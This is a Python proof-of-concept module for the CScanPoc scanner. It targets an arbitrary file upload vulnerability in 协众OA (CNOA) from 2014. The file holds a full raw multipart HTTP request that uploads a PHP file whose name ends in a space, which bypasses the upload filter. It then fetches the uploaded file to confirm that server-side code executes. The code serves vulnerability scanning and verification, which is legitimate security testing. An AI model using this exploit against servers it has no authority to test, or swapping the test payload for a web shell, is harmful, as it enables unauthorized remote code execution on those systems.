# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'cnoa_0001' # 平台漏洞编号，留空
    name = '协众OA系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2014-08-27'  # 漏洞公布时间
    desc = '''
        协众OA系统 function.func.php 中上传末尾加空格的文件名后直接bypass.
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '协众OA系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'caaa5269-5b9e-48a9-946a-eba28403aa38'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload = self.target + '/index.php?action=upFile&act=upforhtmleditor'
            raw = '''
POST /index.php?action=upFile&act=upforhtmleditor HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 412
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw1mFOw5Peney0fTL
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: CNOA_language=cn; CNOAOASESSID=6ve495u5aru635c3jr99v2u6u1

------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="Filedata"; filename="1.php "
Content-Type: application/x-x509-ca-cert

<?php
echo md5(1);
?>
------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="folder"

/
------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryw1mFOw5Peney0fTL--
'''
            code, head, res, errcode, _ = hh.http(payload, raw=raw)
            verify = self.target + res
            code, head, res, errcode, _ = hh.http(verify)
            if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                #security_hole("file uploaded:"+verify+"\r\nref:http://www.wooyun.org/bugs/wooyun-2010-073972")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
